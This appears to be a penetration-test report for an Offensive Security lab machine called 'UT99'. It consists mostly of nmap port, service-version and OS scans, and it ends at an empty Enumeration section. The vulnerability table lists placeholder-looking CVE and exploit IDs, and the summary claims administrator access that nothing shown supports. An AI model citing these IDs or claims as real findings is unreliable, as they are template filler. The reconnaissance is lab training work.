# UT99 
## Table of Contents
* [Executive Summary](#executive-summary)
  * [Attack Vectors](#attack-vectors)
  * [Recommendations](#recommendations)
* [Methodology](#methodology)
  * [Reconnaissance](#reconnaissance)
  * [Enumeration](#enumeration)
  * [Gaining Access](#gaining-access)
  * [Maintaining Access](#maintaining-access)
  * [Covering Tracks](#covering-tracks)
* [Additional Items](#additional-items)

# Executive Summary
On 1 August 2021, Victor Fernandez III performed a penetration test of the Offensive Security exam network. This report includes detailed information about the vulnerabilities he discovered as well as recommendations for mitigating each of them. This report also contains an outline of the methodolgy he used to enumerate and exploit the THINC.local domain. During the penetration test, Victor was able to gain administrator-level access to multiple computers, primarly due to out-of-date and/or misconfigured software. A brief description of each computer compromised is listed below.

## Attack Vectors
| Vulnerabilities | Exploits |
| --- | ---| 
| CVE-2008-1234 | EDB-ID-56789 |
| CVE-2012-5678 | cyberphor POC |

## Recommendations
Victor recommends patching the vulnerabilities he identified to mitigate the risk of exploitation and/or unauthorized access to Offensive Security information systems. One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodology
Victor used a widely-adopted and phased approach for the penetration test. This included reconnaissance, enumeration, gaining access, maintaining access, and covering his tracks. Below is an outline of Victor's activities and serves to demonstrate how he identified and exploited a variety of information systems across the Offensive Security exam network.

## Reconnaissance
The purpose of the reconnaissance phase of a penetration test is to identify information and sytems that represent the organization online and then, discover possible attack vectors. For this penetration test, Victor was asked to narrow his information gathering objectives to collecting the details below. 

### General Information
* Hostname: ut99
* Description: Good old times.
* IP Address: 192.168.238.44
* MAC Address: (ref:) 
* Domain: WORKGROUP
* Distro: Microsoft Windows Server 2012 (ref:)
* Kernel: (ref:)
* Architecture: (ref:)

### Ports
```bash
# Nmap 7.91 scan initiated Sun Aug  1 22:01:36 2021 as: nmap -sS -sU -p- --min-rate 1000 -oN scans/ut99-nmap-complete 192.168.238.44
Nmap scan report for 192.168.238.44
Host is up (0.074s latency).
Not shown: 65534 open|filtered ports, 65187 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
6660/tcp open  unknown
6661/tcp open  unknown
6662/tcp open  radmind
6663/tcp open  unknown
6664/tcp open  unknown
6665/tcp open  irc
6666/tcp open  irc
6667/tcp open  irc
6668/tcp open  irc
6669/tcp open  irc
6670/tcp open  irc
6671/tcp open  p4p-portal
6672/tcp open  vision_server
6673/tcp open  vision_elmd
6674/tcp open  unknown
6675/tcp open  unknown
6676/tcp open  unknown
6677/tcp open  unknown
6678/tcp open  vfbp
6679/tcp open  osaut
6680/tcp open  unknown
6681/tcp open  unknown
6682/tcp open  unknown
6683/tcp open  unknown
6684/tcp open  unknown
6685/tcp open  unknown
6686/tcp open  unknown
6687/tcp open  clever-ctrace
6688/tcp open  clever-tcpip
6689/tcp open  tsa
6690/tcp open  cleverdetect
6691/tcp open  unknown
6692/tcp open  unknown
6693/tcp open  unknown
6694/tcp open  unknown
6695/tcp open  unknown
6696/tcp open  babel
6697/tcp open  ircs-u
6698/tcp open  unknown
6699/tcp open  napster
6700/tcp open  carracho
6701/tcp open  carracho
6702/tcp open  e-design-net
6703/tcp open  e-design-web
6704/tcp open  unknown
6705/tcp open  unknown
6706/tcp open  unknown
6707/tcp open  unknown
6708/tcp open  unknown
6709/tcp open  unknown
6710/tcp open  unknown
6711/tcp open  unknown
6712/tcp open  unknown
6713/tcp open  unknown
6714/tcp open  ibprotocol
6715/tcp open  fibotrader-com
6716/tcp open  princity-agent
6717/tcp open  unknown
6718/tcp open  unknown
6719/tcp open  unknown
6720/tcp open  unknown
6721/tcp open  unknown
6722/tcp open  unknown
6723/tcp open  unknown
6724/tcp open  unknown
6725/tcp open  unknown
6726/tcp open  unknown
6727/tcp open  unknown
6728/tcp open  unknown
6729/tcp open  unknown
6730/tcp open  unknown
6731/tcp open  unknown
6732/tcp open  unknown
6733/tcp open  unknown
6734/tcp open  unknown
6735/tcp open  unknown
6736/tcp open  unknown
6737/tcp open  unknown
6738/tcp open  unknown
6739/tcp open  unknown
6740/tcp open  unknown
6741/tcp open  unknown
6742/tcp open  unknown
6743/tcp open  unknown
6744/tcp open  unknown
6745/tcp open  unknown
6746/tcp open  unknown
6747/tcp open  unknown
6748/tcp open  unknown
6749/tcp open  unknown
6750/tcp open  unknown
6751/tcp open  unknown
6752/tcp open  unknown
6753/tcp open  unknown
6754/tcp open  unknown
6755/tcp open  unknown
6756/tcp open  unknown
6757/tcp open  unknown
6758/tcp open  unknown
6759/tcp open  unknown
6760/tcp open  unknown
6761/tcp open  unknown
6762/tcp open  unknown
6763/tcp open  unknown
6764/tcp open  unknown
6765/tcp open  unknown
6766/tcp open  unknown
6767/tcp open  bmc-perf-agent
6768/tcp open  bmc-perf-mgrd
6769/tcp open  adi-gxp-srvprt
6770/tcp open  plysrv-http
6771/tcp open  plysrv-https
6772/tcp open  unknown
6773/tcp open  unknown
6774/tcp open  unknown
6775/tcp open  unknown
6776/tcp open  unknown
6777/tcp open  ntz-tracker
6778/tcp open  ntz-p2p-storage
6779/tcp open  unknown
6780/tcp open  unknown
6781/tcp open  unknown
6782/tcp open  unknown
6783/tcp open  unknown
6784/tcp open  bfd-lag
6785/tcp open  dgpf-exchg
6786/tcp open  smc-jmx
6787/tcp open  smc-admin
6788/tcp open  smc-http
6789/tcp open  ibm-db2-admin
6790/tcp open  hnmp
6791/tcp open  hnm
6792/tcp open  unknown
6793/tcp open  unknown
6794/tcp open  unknown
6795/tcp open  unknown
6796/tcp open  unknown
6797/tcp open  unknown
6798/tcp open  unknown
6799/tcp open  unknown
6800/tcp open  unknown
6801/tcp open  acnet
6802/tcp open  unknown
6803/tcp open  unknown
6804/tcp open  unknown
6805/tcp open  unknown
6806/tcp open  unknown
6807/tcp open  unknown
6808/tcp open  unknown
6809/tcp open  unknown
6810/tcp open  unknown
6811/tcp open  unknown
6812/tcp open  unknown
6813/tcp open  unknown
6814/tcp open  unknown
6815/tcp open  unknown
6816/tcp open  unknown
6817/tcp open  pentbox-sim
6818/tcp open  unknown
6819/tcp open  unknown
6820/tcp open  unknown
6821/tcp open  unknown
6822/tcp open  unknown
6823/tcp open  unknown
6824/tcp open  unknown
6825/tcp open  unknown
6826/tcp open  unknown
6827/tcp open  unknown
6828/tcp open  unknown
6829/tcp open  unknown
6830/tcp open  unknown
6831/tcp open  ambit-lm
6832/tcp open  unknown
6833/tcp open  unknown
6834/tcp open  unknown
6835/tcp open  unknown
6836/tcp open  unknown
6837/tcp open  unknown
6838/tcp open  unknown
6839/tcp open  unknown
6840/tcp open  unknown
6841/tcp open  netmo-default
6842/tcp open  netmo-http
6843/tcp open  unknown
6844/tcp open  unknown
6845/tcp open  unknown
6846/tcp open  unknown
6847/tcp open  unknown
6848/tcp open  unknown
6849/tcp open  unknown
6850/tcp open  iccrushmore
6851/tcp open  unknown
6852/tcp open  unknown
6853/tcp open  unknown
6854/tcp open  unknown
6855/tcp open  unknown
6856/tcp open  unknown
6857/tcp open  unknown
6858/tcp open  unknown
6859/tcp open  unknown
6860/tcp open  unknown
6861/tcp open  unknown
6862/tcp open  unknown
6863/tcp open  unknown
6864/tcp open  unknown
6865/tcp open  unknown
6866/tcp open  unknown
6867/tcp open  unknown
6868/tcp open  acctopus-cc
6869/tcp open  unknown
6870/tcp open  unknown
6871/tcp open  unknown
6872/tcp open  unknown
6873/tcp open  unknown
6874/tcp open  unknown
6875/tcp open  unknown
6876/tcp open  unknown
6877/tcp open  unknown
6878/tcp open  unknown
6879/tcp open  unknown
6880/tcp open  unknown
6881/tcp open  bittorrent-tracker
6882/tcp open  unknown
6883/tcp open  unknown
6884/tcp open  unknown
6885/tcp open  unknown
6886/tcp open  unknown
6887/tcp open  unknown
6888/tcp open  muse
6889/tcp open  unknown
6890/tcp open  unknown
6891/tcp open  unknown
6892/tcp open  unknown
6893/tcp open  unknown
6894/tcp open  unknown
6895/tcp open  unknown
6896/tcp open  unknown
6897/tcp open  unknown
6898/tcp open  unknown
6899/tcp open  unknown
6900/tcp open  rtimeviewer
6901/tcp open  jetstream
6902/tcp open  unknown
6903/tcp open  unknown
6904/tcp open  unknown
6905/tcp open  unknown
6906/tcp open  unknown
6907/tcp open  unknown
6908/tcp open  unknown
6909/tcp open  unknown
6910/tcp open  unknown
6911/tcp open  unknown
6912/tcp open  unknown
6913/tcp open  unknown
6914/tcp open  unknown
6915/tcp open  unknown
6916/tcp open  unknown
6917/tcp open  unknown
6918/tcp open  unknown
6919/tcp open  unknown
6920/tcp open  unknown
6921/tcp open  unknown
6922/tcp open  unknown
6923/tcp open  unknown
6924/tcp open  split-ping
6925/tcp open  unknown
6926/tcp open  unknown
6927/tcp open  unknown
6928/tcp open  unknown
6929/tcp open  unknown
6930/tcp open  unknown
6931/tcp open  unknown
6932/tcp open  unknown
6933/tcp open  unknown
6934/tcp open  unknown
6935/tcp open  ethoscan
6936/tcp open  xsmsvc
6937/tcp open  unknown
6938/tcp open  unknown
6939/tcp open  unknown
6940/tcp open  unknown
6941/tcp open  unknown
6942/tcp open  unknown
6943/tcp open  unknown
6944/tcp open  unknown
6945/tcp open  unknown
6946/tcp open  bioserver
6947/tcp open  unknown
6948/tcp open  unknown
6949/tcp open  unknown
6950/tcp open  unknown
6951/tcp open  otlp
6952/tcp open  unknown
6953/tcp open  unknown
6954/tcp open  unknown
6955/tcp open  unknown
6956/tcp open  unknown
6957/tcp open  unknown
6958/tcp open  unknown
6959/tcp open  unknown
6960/tcp open  unknown
6961/tcp open  jmact3
6962/tcp open  jmevt2
6963/tcp open  swismgr1
6964/tcp open  swismgr2
6965/tcp open  swistrap
6966/tcp open  swispol
6967/tcp open  unknown
6968/tcp open  unknown
6969/tcp open  acmsoda
6970/tcp open  conductor
6971/tcp open  unknown
6972/tcp open  unknown
6973/tcp open  unknown
6974/tcp open  unknown
6975/tcp open  unknown
6976/tcp open  unknown
6977/tcp open  unknown
6978/tcp open  unknown
6979/tcp open  unknown
6980/tcp open  unknown
6981/tcp open  unknown
6982/tcp open  unknown
6983/tcp open  unknown
6984/tcp open  unknown
6985/tcp open  unknown
6986/tcp open  unknown
6987/tcp open  unknown
6988/tcp open  unknown
6989/tcp open  unknown
6990/tcp open  unknown
6991/tcp open  unknown
6992/tcp open  unknown
6993/tcp open  unknown
6994/tcp open  unknown
6995/tcp open  unknown
6996/tcp open  unknown
6997/tcp open  MobilitySrv
6998/tcp open  iatp-highpri
6999/tcp open  iatp-normalpri
7000/tcp open  afs3-fileserver
7001/tcp open  afs3-callback
7005/tcp open  afs3-volser
7007/tcp open  afs3-bos
7777/udp open  cbt

# Nmap done at Sun Aug  1 22:06:57 2021 -- 1 IP address (1 host up) scanned in 320.58 seconds
```

### Service Versions
```bash
WARNING: Your ports include "U:" but you haven't specified UDP scan with -sU.
# Nmap 7.91 scan initiated Sun Aug  1 22:08:06 2021 as: nmap -sV -sC -pT:21,80,443,3306,6660,6661,6662,6663,6664,6665,6666,6667,6668,6669,6670,6671,6672,6673,6674,6675,6676,6677,6678,6679,6680,6681,6682,6683,6684,6685,6686,6687,6688,6689,6690,6691,6692,6693,6694,6695,6696,6697,6698,6699,6700,6701,6702,6703,6704,6705,6706,6707,6708,6709,6710,6711,6712,6713,6714,6715,6716,6717,6718,6719,6720,6721,6722,6723,6724,6725,6726,6727,6728,6729,6730,6731,6732,6733,6734,6735,6736,6737,6738,6739,6740,6741,6742,6743,6744,6745,6746,6747,6748,6749,6750,6751,6752,6753,6754,6755,6756,6757,6758,6759,6760,6761,6762,6763,6764,6765,6766,6767,6768,6769,6770,6771,6772,6773,6774,6775,6776,6777,6778,6779,6780,6781,6782,6783,6784,6785,6786,6787,6788,6789,6790,6791,6792,6793,6794,6795,6796,6797,6798,6799,6800,6801,6802,6803,6804,6805,6806,6807,6808,6809,6810,6811,6812,6813,6814,6815,6816,6817,6818,6819,6820,6821,6822,6823,6824,6825,6826,6827,6828,6829,6830,6831,6832,6833,6834,6835,6836,6837,6838,6839,6840,6841,6842,6843,6844,6845,6846,6847,6848,6849,6850,6851,6852,6853,6854,6855,6856,6857,6858,6859,6860,6861,6862,6863,6864,6865,6866,6867,6868,6869,6870,6871,6872,6873,6874,6875,6876,6877,6878,6879,6880,6881,6882,6883,6884,6885,6886,6887,6888,6889,6890,6891,6892,6893,6894,6895,6896,6897,6898,6899,6900,6901,6902,6903,6904,6905,6906,6907,6908,6909,6910,6911,6912,6913,6914,6915,6916,6917,6918,6919,6920,6921,6922,6923,6924,6925,6926,6927,6928,6929,6930,6931,6932,6933,6934,6935,6936,6937,6938,6939,6940,6941,6942,6943,6944,6945,6946,6947,6948,6949,6950,6951,6952,6953,6954,6955,6956,6957,6958,6959,6960,6961,6962,6963,6964,6965,6966,6967,6968,6969,6970,6971,6972,6973,6974,6975,6976,6977,6978,6979,6980,6981,6982,6983,6984,6985,6986,6987,6988,6989,6990,6991,6992,6993,6994,6995,6996,6997,6998,6999,7000,7001,7005,7007,U:7777 -oN scans/ut99-nmap-versions 192.168.238.44
Nmap scan report for 192.168.238.44
Host is up (0.079s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http       Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_http-title: Index of /
443/tcp  open  ssl/http   Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql      MySQL (unauthorized)
6660/tcp open  irc        InspIRCd
6661/tcp open  irc        InspIRCd
6662/tcp open  irc        InspIRCd
6663/tcp open  irc        InspIRCd
6664/tcp open  irc        InspIRCd
6665/tcp open  irc        InspIRCd
6666/tcp open  irc        InspIRCd
6667/tcp open  irc        InspIRCd
6668/tcp open  irc        InspIRCd
6669/tcp open  irc        InspIRCd
6670/tcp open  irc        InspIRCd
6671/tcp open  irc        InspIRCd
6672/tcp open  irc        InspIRCd
6673/tcp open  irc        InspIRCd
6674/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6675/tcp open  irc        InspIRCd
6676/tcp open  irc        InspIRCd
6677/tcp open  irc        InspIRCd
6678/tcp open  irc        InspIRCd
6679/tcp open  irc        InspIRCd
6680/tcp open  irc        InspIRCd
6681/tcp open  irc        InspIRCd
6682/tcp open  irc        InspIRCd
6683/tcp open  irc        InspIRCd
6684/tcp open  irc        InspIRCd
6685/tcp open  irc        InspIRCd
6686/tcp open  irc        InspIRCd
6687/tcp open  irc        InspIRCd
6688/tcp open  irc        InspIRCd
6689/tcp open  irc        InspIRCd
6690/tcp open  irc        InspIRCd
6691/tcp open  irc        InspIRCd
6692/tcp open  irc        InspIRCd
6693/tcp open  irc        InspIRCd
6694/tcp open  irc        InspIRCd
6695/tcp open  irc        InspIRCd
6696/tcp open  irc        InspIRCd
6697/tcp open  irc        InspIRCd
6698/tcp open  irc        InspIRCd
6699/tcp open  irc        InspIRCd
6700/tcp open  irc        InspIRCd
6701/tcp open  irc        InspIRCd
6702/tcp open  irc        InspIRCd
6703/tcp open  irc        InspIRCd
6704/tcp open  irc        InspIRCd
6705/tcp open  irc        InspIRCd
6706/tcp open  irc        InspIRCd
6707/tcp open  irc        InspIRCd
6708/tcp open  irc        InspIRCd
6709/tcp open  irc        InspIRCd
6710/tcp open  irc        InspIRCd
6711/tcp open  irc        InspIRCd
6712/tcp open  irc        InspIRCd
6713/tcp open  irc        InspIRCd
6714/tcp open  irc        InspIRCd
6715/tcp open  irc        InspIRCd
6716/tcp open  irc        InspIRCd
6717/tcp open  irc        InspIRCd
6718/tcp open  irc        InspIRCd
6719/tcp open  irc        InspIRCd
6720/tcp open  irc        InspIRCd
6721/tcp open  irc        InspIRCd
6722/tcp open  irc        InspIRCd
6723/tcp open  irc        InspIRCd
6724/tcp open  irc        InspIRCd
6725/tcp open  irc        InspIRCd
6726/tcp open  irc        InspIRCd
6727/tcp open  irc        InspIRCd
6728/tcp open  irc        InspIRCd
6729/tcp open  irc        InspIRCd
6730/tcp open  irc        InspIRCd
6731/tcp open  irc        InspIRCd
6732/tcp open  irc        InspIRCd
6733/tcp open  irc        InspIRCd
6734/tcp open  irc        InspIRCd
6735/tcp open  irc        InspIRCd
6736/tcp open  irc        InspIRCd
6737/tcp open  irc        InspIRCd
6738/tcp open  irc        InspIRCd
6739/tcp open  irc        InspIRCd
6740/tcp open  irc        InspIRCd
6741/tcp open  irc        InspIRCd
6742/tcp open  irc        InspIRCd
6743/tcp open  irc        InspIRCd
6744/tcp open  irc        InspIRCd
6745/tcp open  irc        InspIRCd
6746/tcp open  irc        InspIRCd
6747/tcp open  irc        InspIRCd
6748/tcp open  irc        InspIRCd
6749/tcp open  irc        InspIRCd
6750/tcp open  irc        InspIRCd
6751/tcp open  irc        InspIRCd
6752/tcp open  irc        InspIRCd
6753/tcp open  irc        InspIRCd
6754/tcp open  irc        InspIRCd
6755/tcp open  irc        InspIRCd
6756/tcp open  irc        InspIRCd
6757/tcp open  irc        InspIRCd
6758/tcp open  irc        InspIRCd
6759/tcp open  irc        InspIRCd
6760/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6761/tcp open  irc        InspIRCd
6762/tcp open  irc        InspIRCd
6763/tcp open  irc        InspIRCd
6764/tcp open  irc        InspIRCd
6765/tcp open  irc        InspIRCd
6766/tcp open  irc        InspIRCd
6767/tcp open  irc        InspIRCd
6768/tcp open  irc        InspIRCd
6769/tcp open  irc        InspIRCd
6770/tcp open  irc        InspIRCd
6771/tcp open  irc        InspIRCd
6772/tcp open  irc        InspIRCd
6773/tcp open  irc        InspIRCd
6774/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6775/tcp open  irc        InspIRCd
6776/tcp open  irc        InspIRCd
6777/tcp open  irc        InspIRCd
6778/tcp open  irc        InspIRCd
6779/tcp open  irc        InspIRCd
6780/tcp open  irc        InspIRCd
6781/tcp open  irc        InspIRCd
6782/tcp open  irc        InspIRCd
6783/tcp open  irc        InspIRCd
6784/tcp open  irc        InspIRCd
6785/tcp open  irc        InspIRCd
6786/tcp open  irc        InspIRCd
6787/tcp open  irc        InspIRCd
6788/tcp open  irc        InspIRCd
6789/tcp open  irc        InspIRCd
6790/tcp open  irc        InspIRCd
6791/tcp open  irc        InspIRCd
6792/tcp open  irc        InspIRCd
6793/tcp open  irc        InspIRCd
6794/tcp open  irc        InspIRCd
6795/tcp open  irc        InspIRCd
6796/tcp open  irc        InspIRCd
6797/tcp open  irc        InspIRCd
6798/tcp open  irc        InspIRCd
6799/tcp open  irc        InspIRCd
6800/tcp open  irc        InspIRCd
6801/tcp open  irc        InspIRCd
6802/tcp open  irc        InspIRCd
6803/tcp open  irc        InspIRCd
6804/tcp open  irc        InspIRCd
6805/tcp open  irc        InspIRCd
6806/tcp open  irc        InspIRCd
6807/tcp open  irc        InspIRCd
6808/tcp open  irc        InspIRCd
6809/tcp open  irc        InspIRCd
6810/tcp open  irc        InspIRCd
6811/tcp open  irc        InspIRCd
6812/tcp open  irc        InspIRCd
6813/tcp open  irc        InspIRCd
6814/tcp open  irc        InspIRCd
6815/tcp open  irc        InspIRCd
6816/tcp open  irc        InspIRCd
6817/tcp open  irc        InspIRCd
6818/tcp open  irc        InspIRCd
6819/tcp open  irc        InspIRCd
6820/tcp open  irc        InspIRCd
6821/tcp open  irc        InspIRCd
6822/tcp open  irc        InspIRCd
6823/tcp open  irc        InspIRCd
6824/tcp open  irc        InspIRCd
6825/tcp open  irc        InspIRCd
6826/tcp open  irc        InspIRCd
6827/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6828/tcp open  irc        InspIRCd
6829/tcp open  irc        InspIRCd
6830/tcp open  irc        InspIRCd
6831/tcp open  irc        InspIRCd
6832/tcp open  irc        InspIRCd
6833/tcp open  irc        InspIRCd
6834/tcp open  irc        InspIRCd
6835/tcp open  irc        InspIRCd
6836/tcp open  irc        InspIRCd
6837/tcp open  irc        InspIRCd
6838/tcp open  irc        InspIRCd
6839/tcp open  irc        InspIRCd
6840/tcp open  irc        InspIRCd
6841/tcp open  irc        InspIRCd
6842/tcp open  irc        InspIRCd
6843/tcp open  irc        InspIRCd
6844/tcp open  irc        InspIRCd
6845/tcp open  irc        InspIRCd
6846/tcp open  irc        InspIRCd
6847/tcp open  irc        InspIRCd
6848/tcp open  irc        InspIRCd
6849/tcp open  irc        InspIRCd
6850/tcp open  irc        InspIRCd
6851/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6852/tcp open  irc        InspIRCd
6853/tcp open  irc        InspIRCd
6854/tcp open  irc        InspIRCd
6855/tcp open  irc        InspIRCd
6856/tcp open  irc        InspIRCd
6857/tcp open  irc        InspIRCd
6858/tcp open  irc        InspIRCd
6859/tcp open  irc        InspIRCd
6860/tcp open  irc        InspIRCd
6861/tcp open  irc        InspIRCd
6862/tcp open  irc        InspIRCd
6863/tcp open  irc        InspIRCd
6864/tcp open  irc        InspIRCd
6865/tcp open  irc        InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 2
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.238
|_  error: Closing link: (nmap@192.168.49.238) [Client exited]
6866/tcp open  irc        InspIRCd
6867/tcp open  irc        InspIRCd
6868/tcp open  irc        InspIRCd
6869/tcp open  irc        InspIRCd
6870/tcp open  irc        InspIRCd
6871/tcp open  irc        InspIRCd
6872/tcp open  irc        InspIRCd
6873/tcp open  irc        InspIRCd
6874/tcp open  irc        InspIRCd
6875/tcp open  irc        InspIRCd
6876/tcp open  irc        InspIRCd
6877/tcp open  irc        InspIRCd
6878/tcp open  irc        InspIRCd
6879/tcp open  irc        InspIRCd
6880/tcp open  irc        InspIRCd
6881/tcp open  irc        InspIRCd
6882/tcp open  irc        InspIRCd
6883/tcp open  irc        InspIRCd
6884/tcp open  irc        InspIRCd
6885/tcp open  irc        InspIRCd
6886/tcp open  irc        InspIRCd
6887/tcp open  irc        InspIRCd
6888/tcp open  irc        InspIRCd
6889/tcp open  irc        InspIRCd
6890/tcp open  irc        InspIRCd
6891/tcp open  irc        InspIRCd
6892/tcp open  irc        InspIRCd
6893/tcp open  irc        InspIRCd
6894/tcp open  irc        InspIRCd
6895/tcp open  irc        InspIRCd
6896/tcp open  irc        InspIRCd
6897/tcp open  irc        InspIRCd
6898/tcp open  irc        InspIRCd
6899/tcp open  irc        InspIRCd
6900/tcp open  irc        InspIRCd
6901/tcp open  irc        InspIRCd
6902/tcp open  irc        InspIRCd
6903/tcp open  irc        InspIRCd
6904/tcp open  irc        InspIRCd
6905/tcp open  irc        InspIRCd
6906/tcp open  irc        InspIRCd
6907/tcp open  irc        InspIRCd
6908/tcp open  irc        InspIRCd
6909/tcp open  irc        InspIRCd
6910/tcp open  irc        InspIRCd
6911/tcp open  irc        InspIRCd
6912/tcp open  irc        InspIRCd
6913/tcp open  irc        InspIRCd
6914/tcp open  irc        InspIRCd
6915/tcp open  irc        InspIRCd
6916/tcp open  irc        InspIRCd
6917/tcp open  irc        InspIRCd
6918/tcp open  irc        InspIRCd
6919/tcp open  irc        InspIRCd
6920/tcp open  irc        InspIRCd
6921/tcp open  irc        InspIRCd
6922/tcp open  irc        InspIRCd
6923/tcp open  irc        InspIRCd
6924/tcp open  irc        InspIRCd
6925/tcp open  irc        InspIRCd
6926/tcp open  irc        InspIRCd
6927/tcp open  irc        InspIRCd
6928/tcp open  irc        InspIRCd
6929/tcp open  irc        InspIRCd
6930/tcp open  irc        InspIRCd
6931/tcp open  irc        InspIRCd
6932/tcp open  irc        InspIRCd
6933/tcp open  irc        InspIRCd
6934/tcp open  irc        InspIRCd
6935/tcp open  irc        InspIRCd
6936/tcp open  irc        InspIRCd
6937/tcp open  irc        InspIRCd
6938/tcp open  irc        InspIRCd
6939/tcp open  irc        InspIRCd
6940/tcp open  irc        InspIRCd
6941/tcp open  irc        InspIRCd
6942/tcp open  irc        InspIRCd
6943/tcp open  irc        InspIRCd
6944/tcp open  irc        InspIRCd
6945/tcp open  irc        InspIRCd
6946/tcp open  irc        InspIRCd
6947/tcp open  irc        InspIRCd
6948/tcp open  irc        InspIRCd
6949/tcp open  irc        InspIRCd
6950/tcp open  irc        InspIRCd
6951/tcp open  irc        InspIRCd
6952/tcp open  irc        InspIRCd
6953/tcp open  irc        InspIRCd
6954/tcp open  irc        InspIRCd
6955/tcp open  irc        InspIRCd
6956/tcp open  irc        InspIRCd
6957/tcp open  irc        InspIRCd
6958/tcp open  irc        InspIRCd
6959/tcp open  irc        InspIRCd
6960/tcp open  irc        InspIRCd
6961/tcp open  irc        InspIRCd
6962/tcp open  irc        InspIRCd
6963/tcp open  irc        InspIRCd
6964/tcp open  irc        InspIRCd
6965/tcp open  irc        InspIRCd
6966/tcp open  irc        InspIRCd
6967/tcp open  irc        InspIRCd
6968/tcp open  irc        InspIRCd
6969/tcp open  irc        InspIRCd
6970/tcp open  irc        InspIRCd
6971/tcp open  irc        InspIRCd
6972/tcp open  irc        InspIRCd
6973/tcp open  irc        InspIRCd
6974/tcp open  irc        InspIRCd
6975/tcp open  irc        InspIRCd
6976/tcp open  irc        InspIRCd
6977/tcp open  irc        InspIRCd
6978/tcp open  irc        InspIRCd
6979/tcp open  irc        InspIRCd
6980/tcp open  irc        InspIRCd
6981/tcp open  irc        InspIRCd
6982/tcp open  irc        InspIRCd
6983/tcp open  irc        InspIRCd
6984/tcp open  irc        InspIRCd
6985/tcp open  irc        InspIRCd
6986/tcp open  irc        InspIRCd
6987/tcp open  irc        InspIRCd
6988/tcp open  irc        InspIRCd
6989/tcp open  irc        InspIRCd
6990/tcp open  irc        InspIRCd
6991/tcp open  irc        InspIRCd
6992/tcp open  irc        InspIRCd
6993/tcp open  irc        InspIRCd
6994/tcp open  irc        InspIRCd
6995/tcp open  irc        InspIRCd
6996/tcp open  irc        InspIRCd
6997/tcp open  irc        InspIRCd
6998/tcp open  irc        InspIRCd
6999/tcp open  irc        InspIRCd
7000/tcp open  irc        InspIRCd
7001/tcp open  tcpwrapped
7005/tcp open  tcpwrapped
7007/tcp open  irc        InspIRCd
Service Info: Hosts: localhost, www.example.com, irc.madcowz.localdomain; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 22:08:35 2021 -- 1 IP address (1 host up) scanned in 28.91 seconds
```

### Operating System
```bash
# Nmap 7.91 scan initiated Sun Aug  1 22:29:14 2021 as: nmap -O -oN scans/ut99-nmap-os 192.168.238.44
Nmap scan report for 192.168.238.44
Host is up (0.081s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
6666/tcp open  irc
6667/tcp open  irc
6668/tcp open  irc
6669/tcp open  irc
6689/tcp open  tsa
6692/tcp open  unknown
6699/tcp open  napster
6779/tcp open  unknown
6788/tcp open  smc-http
6789/tcp open  ibm-db2-admin
6792/tcp open  unknown
6839/tcp open  unknown
6881/tcp open  bittorrent-tracker
6901/tcp open  jetstream
6969/tcp open  acmsoda
7000/tcp open  afs3-fileserver
7001/tcp open  afs3-callback
7007/tcp open  afs3-bos
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|router|general purpose
Running (JUST GUESSING): Linux 2.4.X (97%), MikroTik RouterOS 6.X (95%), Microsoft Windows 2012 (87%)
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:mikrotik:routeros:6.15 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Tomato 1.27 - 1.28 (Linux 2.4.20) (97%), MikroTik RouterOS 6.15 (Linux 3.3.5) (95%), Microsoft Windows Server 2012 R2 (87%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  1 22:29:24 2021 -- 1 IP address (1 host up) scanned in 9.99 seconds
```

## Enumeration
